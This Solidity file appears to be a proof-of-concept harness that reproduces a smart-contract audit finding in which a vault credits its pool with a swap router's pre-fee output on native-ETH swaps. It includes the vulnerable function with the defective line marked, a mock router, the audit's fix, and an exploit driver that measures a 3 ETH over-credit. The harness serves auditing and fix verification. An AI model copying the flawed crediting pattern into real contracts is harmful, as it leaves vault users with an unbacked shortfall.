// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Funnel finding 62621 (H-02):
// "swapTokens does not account for SwapX router fees when the out token is native".
//
// When the out token is native, the SwapX router charges a fee on the OUTPUT of
// the swap (takeFee, native-out path): it forwards only `amountOut - fee` native
// ETH to the recipient but STILL RETURNS the full pre-fee `amountOut` to the
// caller. FunnelVaultUpgradeable.swapTokens trusts that returned value and credits
// its pool accounting with the full `amountOut` (addToPoolBurn / addToPoolHIP),
// even though the vault only actually received `amountOut - fee`. The pool is
// therefore over-credited by the skimmed fee on every native-out swap; the
// shortfall accumulates and the last withdrawer(s) are left insolvent.
//
// Honesty contract:
//   * FunnelVaultUpgradeable.swapTokens is inlined VERBATIM from the finding
//     (imports/pragma stripped). The `// @>` line is the exact defective line.
//   * MockSwapX is a faithful minimal double of the OPAQUE external boundary
//     (the SwapX router — separate, now-private repo). It reproduces the
//     documented `takeFee` native-out fee-on-output behaviour byte-for-byte:
//     it returns the pre-fee `amountOut` while sending only `amountOut - fee`.
//     The vulnerable contract/function itself is NEVER mocked.
//   * addToPoolBurn / addToPoolHIP internals are not embedded in the finding and
//     are not the bug; they are reduced to a minimal accounting double
//     `poolCredited[pool] += amount` per the triage reduction plan.
//   * Harm is a concrete accounting delta with numbers: pool credited 100 ETH
//     while the vault holds only 97 ETH → a 3 ETH over-credit (== the fee),
//     recorded as a SHORTFALL-ETH marker to the 0x..D00d SINK.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful ERC20 double. Used for the opaque `tokenIn` and as the
///      WETH token whose address the vault compares against; also the harm marker.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev The SwapX router surface the vault calls into.
interface ISwapX {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function swapV3ExactIn(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);

    function swapV2ExactIn(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address poolAddress
    ) external payable returns (uint256 amountOut);
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal double of the OPAQUE external boundary: the SwapX router.
// Reproduces the documented native-out fee-on-output (takeFee): returns the
// PRE-FEE amountOut while forwarding only `amountOut - fee` native ETH.
// (SwapX@takeFee / swapV2ExactIn / swapV3ExactIn from the finding.)
// ─────────────────────────────────────────────────────────────────────────────
contract MockSwapX {
    address public immutable WETH;
    address public feeCollector;
    uint256 public feeRate; // e.g. 300
    uint256 public constant feeDenominator = 10000;
    mapping(address => bool) public feeExcludeList;

    constructor(address weth, address _feeCollector, uint256 _feeRate) {
        WETH = weth;
        feeCollector = _feeCollector;
        feeRate = _feeRate;
    }

    // Router is pre-funded with native ETH (models `IWETH(WETH).withdraw(amountOut)`).
    receive() external payable {}

    // Verbatim-faithful takeFee: skims `fee` of the OUTPUT to the feeCollector when
    // the out token is native, and RETURNS the fee to the caller (SwapX@takeFee).
    function takeFee(address tokenIn, uint256 amountIn) internal returns (uint256) {
        if (feeExcludeList[msg.sender]) {
            return 0;
        }

        uint256 fee = amountIn * feeRate / feeDenominator;

        if (tokenIn == address(0) || tokenIn == WETH) {
            require(address(this).balance > fee, "insufficient funds");
            (bool success, ) = address(feeCollector).call{ value: fee }("");
            require(success, "SwapX: take fee error");
        }

        return fee;
    }

    // Faithful native-out V3 path (SwapX@swapV3ExactIn): withdraw to native, skim
    // the fee, forward only `amountOut - fee`, but return the full pre-fee amountOut.
    function swapV3ExactIn(ISwapX.ExactInputSingleParams memory params) external payable returns (uint256 amountOut) {
        bool nativeOut = (params.tokenOut == WETH);

        amountOut = params.amountIn; // 1:1 modeled pool output (gross, pre-fee)

        require(amountOut >= params.amountOutMinimum, "SwapX: insufficient out amount");

        if (nativeOut) {
            // IWETH(WETH).withdraw(amountOut) -> router holds `amountOut` native (pre-funded)
            uint256 fee = takeFee(address(0), amountOut);
            (bool success, ) = address(params.recipient).call{value: amountOut - fee}("");
            require(success, "SwapX: send ETH out error");
        }
        // returns the PRE-FEE amountOut — the value the vault wrongly trusts.
    }

    // Faithful native-out V2 path (SwapX@swapV2ExactIn): tokenOut == address(0) is native.
    function swapV2ExactIn(
        address /*tokenIn*/,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address /*poolAddress*/
    ) external payable returns (uint amountOut) {
        bool nativeOut = (tokenOut == address(0));

        amountOut = amountIn; // 1:1 modeled pool output (gross, pre-fee)

        if (nativeOut) {
            uint256 fee = takeFee(address(0), amountOut);
            (bool success, ) = address(msg.sender).call{value: amountOut - fee}("");
            require(success, "SwapX: send ETH out error");
        }
        require(
            amountOut >= amountOutMin,
            'SwapX: insufficient output amount'
        );
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: FunnelVaultUpgradeable with swapTokens inlined VERBATIM.
// Minimal faithful doubles supplied for the modifiers / role gate / accounting
// helpers (their internals are not embedded in the finding and are not the bug).
// ─────────────────────────────────────────────────────────────────────────────
contract FunnelVaultUpgradeable {
    bytes32 public constant EXECUTER_ROLE = keccak256("EXECUTER_ROLE");
    address public immutable WETH;

    mapping(bytes32 => mapping(address => bool)) private _roles;
    uint256 private _entered;

    // Minimal accounting double for the pool credit (addToPool* internals not the bug).
    mapping(address => uint256) public poolCredited;

    error ZeroAddress();
    error SwapFailed();

    event TokenSwapped(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut, address swapRouter);

    struct SwapParams {
        bool useV3;
        address tokenIn;
        address tokenOut;
        uint24 fee;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMin;
        address poolAddress;
        address payingPool;
    }

    modifier onlyRole(bytes32 role) {
        require(_roles[role][msg.sender], "AccessControl: missing role");
        _;
    }

    modifier nonReentrant() {
        require(_entered == 0, "ReentrancyGuard: reentrant call");
        _entered = 1;
        _;
        _entered = 0;
    }

    constructor(address weth) {
        WETH = weth;
    }

    function grantExecuter(address who) external {
        _roles[EXECUTER_ROLE][who] = true;
    }

    receive() external payable {}

    // Minimal accounting doubles: record what the pool is credited. The bug is the
    // AMOUNT passed in (pre-fee `amountOut`), not any addToPool* internal.
    function addToPoolBurn(address /*token*/, address pool, uint256 amount) internal {
        poolCredited[pool] += amount;
    }

    function addToPoolHIP(address /*token*/, address pool, uint256 amount) internal {
        poolCredited[pool] += amount;
    }

    // ===================== VERBATIM swapTokens (from the finding) =====================
    function swapTokens(SwapParams calldata swapParams, address swapRouter, bool isBurn) external onlyRole(EXECUTER_ROLE) nonReentrant returns (uint256 amountOut) {
        // ... (input validation / token approvals omitted in the finding excerpt)

        if (swapParams.useV3) {
            ISwapX.ExactInputSingleParams memory params = ISwapX.ExactInputSingleParams({
                tokenIn: swapParams.tokenIn,
                tokenOut: swapParams.tokenOut,
                fee: swapParams.fee,
                recipient: address(this),
                deadline: swapParams.deadline,
                amountIn: swapParams.amountIn,
                amountOutMinimum: swapParams.amountOutMin,
                sqrtPriceLimitX96: 0
            });

            if (params.tokenIn == address(0)) {
                amountOut = ISwapX(swapRouter).swapV3ExactIn{value: params.amountIn}(params);
            } else {
                amountOut = ISwapX(swapRouter).swapV3ExactIn(params);
            }
        } else {
            if (swapParams.poolAddress == address(0)) {
                revert ZeroAddress();
            }

            if (swapParams.tokenIn == address(0)) {
                amountOut = ISwapX(swapRouter).swapV2ExactIn{value: swapParams.amountIn}(
                    swapParams.tokenIn,
                    swapParams.tokenOut,
                    swapParams.amountIn,
                    swapParams.amountOutMin,
                    swapParams.poolAddress
                );
            } else {
                amountOut = ISwapX(swapRouter).swapV2ExactIn(
                    swapParams.tokenIn,
                    swapParams.tokenOut,
                    swapParams.amountIn,
                    swapParams.amountOutMin,
                    swapParams.poolAddress
                );
            }
        }

        if (amountOut == 0) {
            revert SwapFailed();
        }

        if (swapParams.tokenOut == WETH && swapParams.useV3) {
            if(isBurn){
                addToPoolBurn(address(0), swapParams.payingPool, amountOut);
            } else {
                addToPoolHIP(address(0), swapParams.payingPool, amountOut); // @> credits the returned PRE-FEE amountOut; the vault only received amountOut-fee (SwapX skimmed the native-out fee) -> pool over-credited by fee
            }
        } else {
            if(isBurn){
                addToPoolBurn(swapParams.tokenOut, swapParams.payingPool, amountOut);
            } else {
                addToPoolHIP(swapParams.tokenOut, swapParams.payingPool, amountOut);
            }
        }

        emit TokenSwapped(swapParams.tokenIn, swapParams.tokenOut, swapParams.amountIn, amountOut, swapRouter);
    }
    // =================================================================================
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: the audit's recommendation — do NOT rely on the returned out
// amount; compare the vault's balance before and after the swap and credit the
// actually-received amount. Native-out over-credit becomes zero.
// ─────────────────────────────────────────────────────────────────────────────
contract FunnelVaultUpgradeableFixed {
    bytes32 public constant EXECUTER_ROLE = keccak256("EXECUTER_ROLE");
    address public immutable WETH;

    mapping(bytes32 => mapping(address => bool)) private _roles;
    uint256 private _entered;

    mapping(address => uint256) public poolCredited;

    error ZeroAddress();
    error SwapFailed();

    event TokenSwapped(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut, address swapRouter);

    struct SwapParams {
        bool useV3;
        address tokenIn;
        address tokenOut;
        uint24 fee;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMin;
        address poolAddress;
        address payingPool;
    }

    modifier onlyRole(bytes32 role) {
        require(_roles[role][msg.sender], "AccessControl: missing role");
        _;
    }

    modifier nonReentrant() {
        require(_entered == 0, "ReentrancyGuard: reentrant call");
        _entered = 1;
        _;
        _entered = 0;
    }

    constructor(address weth) {
        WETH = weth;
    }

    function grantExecuter(address who) external {
        _roles[EXECUTER_ROLE][who] = true;
    }

    receive() external payable {}

    function addToPoolBurn(address /*token*/, address pool, uint256 amount) internal {
        poolCredited[pool] += amount;
    }

    function addToPoolHIP(address /*token*/, address pool, uint256 amount) internal {
        poolCredited[pool] += amount;
    }

    function swapTokens(SwapParams calldata swapParams, address swapRouter, bool isBurn) external onlyRole(EXECUTER_ROLE) nonReentrant returns (uint256 amountOut) {
        bool nativeOut = (swapParams.tokenOut == WETH && swapParams.useV3);
        // FIX: snapshot the native balance before the swap.
        uint256 balBefore = nativeOut ? address(this).balance : 0;

        if (swapParams.useV3) {
            ISwapX.ExactInputSingleParams memory params = ISwapX.ExactInputSingleParams({
                tokenIn: swapParams.tokenIn,
                tokenOut: swapParams.tokenOut,
                fee: swapParams.fee,
                recipient: address(this),
                deadline: swapParams.deadline,
                amountIn: swapParams.amountIn,
                amountOutMinimum: swapParams.amountOutMin,
                sqrtPriceLimitX96: 0
            });

            if (params.tokenIn == address(0)) {
                amountOut = ISwapX(swapRouter).swapV3ExactIn{value: params.amountIn}(params);
            } else {
                amountOut = ISwapX(swapRouter).swapV3ExactIn(params);
            }
        } else {
            if (swapParams.poolAddress == address(0)) {
                revert ZeroAddress();
            }

            if (swapParams.tokenIn == address(0)) {
                amountOut = ISwapX(swapRouter).swapV2ExactIn{value: swapParams.amountIn}(
                    swapParams.tokenIn,
                    swapParams.tokenOut,
                    swapParams.amountIn,
                    swapParams.amountOutMin,
                    swapParams.poolAddress
                );
            } else {
                amountOut = ISwapX(swapRouter).swapV2ExactIn(
                    swapParams.tokenIn,
                    swapParams.tokenOut,
                    swapParams.amountIn,
                    swapParams.amountOutMin,
                    swapParams.poolAddress
                );
            }
        }

        if (amountOut == 0) {
            revert SwapFailed();
        }

        // FIX: credit the ACTUALLY-received amount, not the router's pre-fee return.
        uint256 credited = nativeOut ? (address(this).balance - balBefore) : amountOut;

        if (nativeOut) {
            if(isBurn){
                addToPoolBurn(address(0), swapParams.payingPool, credited);
            } else {
                addToPoolHIP(address(0), swapParams.payingPool, credited);
            }
        } else {
            if(isBurn){
                addToPoolBurn(swapParams.tokenOut, swapParams.payingPool, credited);
            } else {
                addToPoolHIP(swapParams.tokenOut, swapParams.payingPool, credited);
            }
        }

        emit TokenSwapped(swapParams.tokenIn, swapParams.tokenOut, swapParams.amountIn, amountOut, swapRouter);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: drive one native-out V3 swap through the REAL buggy swapTokens.
// The router returns 100 ETH (pre-fee) but only forwards 97 ETH; the pool is
// credited the full 100 ETH → 3 ETH phantom credit that the vault never received.
// The over-credit is the accumulating shortfall that bricks the last withdrawer(s);
// it is recorded on a SHORTFALL-ETH marker minted to the SINK. The FIXED variant
// (balance-before/after) credits the real 97 ETH → zero over-credit (control).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    address internal constant FEE_COLLECTOR = 0x000000000000000000000000000000000000Fee5;

    uint256 internal constant AMOUNT_IN = 100 ether; // 1:1 modeled gross output
    uint256 internal constant FEE_RATE   = 300;      // 3% native-out fee on output

    // Deployed doubles / contracts (deterministic CREATE order from this Exploit).
    MiniToken public weth;
    MockSwapX public swapx;
    FunnelVaultUpgradeable public vault;        // REAL vulnerable contract
    FunnelVaultUpgradeableFixed public vaultFixed; // negative control
    MiniToken public marker;

    // Exposed results.
    address public payingPool;
    uint256 public buggyPoolCredited;   // == pre-fee amountOut (100 ETH)
    uint256 public buggyVaultBalance;   // == amountOut - fee   (97 ETH)
    uint256 public buggyOverCredit;     // == fee               (3 ETH)  <- HARM
    uint256 public fixedPoolCredited;   // == amountOut - fee   (97 ETH)
    uint256 public fixedVaultBalance;   // == amountOut - fee   (97 ETH)
    uint256 public fixedOverCredit;     // == 0                 (control)
    uint256 public sinkMarkerBalance;   // marker minted to SINK == buggyOverCredit
    address public vaultAddr;
    address public markerAddr;

    constructor() {
        // Fixed deploy order (marker LAST).
        weth = new MiniToken("Wrapped Ether", "WETH");                      // #1
        swapx = new MockSwapX(address(weth), FEE_COLLECTOR, FEE_RATE);      // #2
        vault = new FunnelVaultUpgradeable(address(weth));                  // #3 (VULN)
        vaultFixed = new FunnelVaultUpgradeableFixed(address(weth));        // #4 (control)
        marker = new MiniToken("SwapX native-out shortfall", "SHORTFALL-ETH"); // #5 (LAST)

        vaultAddr = address(vault);
        markerAddr = address(marker);
        payingPool = address(uint160(uint256(keccak256("Funnel.payingPool"))));
    }

    function run() external payable {
        // Fund the router with the native it will "withdraw" and distribute for two swaps.
        (bool ok, ) = address(swapx).call{value: 2 * AMOUNT_IN}("");
        require(ok, "fund router");

        // Grant the executer role to this driver on both vaults.
        vault.grantExecuter(address(this));
        vaultFixed.grantExecuter(address(this));

        FunnelVaultUpgradeable.SwapParams memory p = FunnelVaultUpgradeable.SwapParams({
            useV3: true,
            tokenIn: address(weth),        // non-zero tokenIn -> no msg.value leg
            tokenOut: address(weth),       // == WETH && useV3 -> native-out crediting branch
            fee: 3000,
            deadline: type(uint256).max,
            amountIn: AMOUNT_IN,
            amountOutMin: 0,
            poolAddress: address(0),
            payingPool: payingPool
        });

        // ---- REAL buggy path ----
        vault.swapTokens(p, address(swapx), false);

        buggyPoolCredited = vault.poolCredited(payingPool); // 100 ETH (pre-fee credit)
        buggyVaultBalance = address(vault).balance;         // 97 ETH  (actually received)
        buggyOverCredit = buggyPoolCredited - buggyVaultBalance; // 3 ETH phantom credit

        require(buggyOverCredit > 0, "no over-credit");
        require(buggyPoolCredited == AMOUNT_IN, "credit != pre-fee amountOut");
        require(buggyVaultBalance == AMOUNT_IN - (AMOUNT_IN * FEE_RATE / 10000), "vault balance != post-fee");

        // ---- negative control: the audit's fix ----
        FunnelVaultUpgradeableFixed.SwapParams memory pf = FunnelVaultUpgradeableFixed.SwapParams({
            useV3: true,
            tokenIn: address(weth),
            tokenOut: address(weth),
            fee: 3000,
            deadline: type(uint256).max,
            amountIn: AMOUNT_IN,
            amountOutMin: 0,
            poolAddress: address(0),
            payingPool: payingPool
        });
        vaultFixed.swapTokens(pf, address(swapx), false);

        fixedPoolCredited = vaultFixed.poolCredited(payingPool); // 97 ETH
        fixedVaultBalance = address(vaultFixed).balance;         // 97 ETH
        fixedOverCredit = fixedPoolCredited - fixedVaultBalance; // 0
        require(fixedOverCredit == 0, "fix still over-credits");

        // ---- record the harm magnitude (accumulating shortfall) at the SINK ----
        marker.mint(SINK, buggyOverCredit);
        sinkMarkerBalance = marker.balanceOf(SINK);
        require(sinkMarkerBalance == buggyOverCredit, "marker mismatch");
    }
}
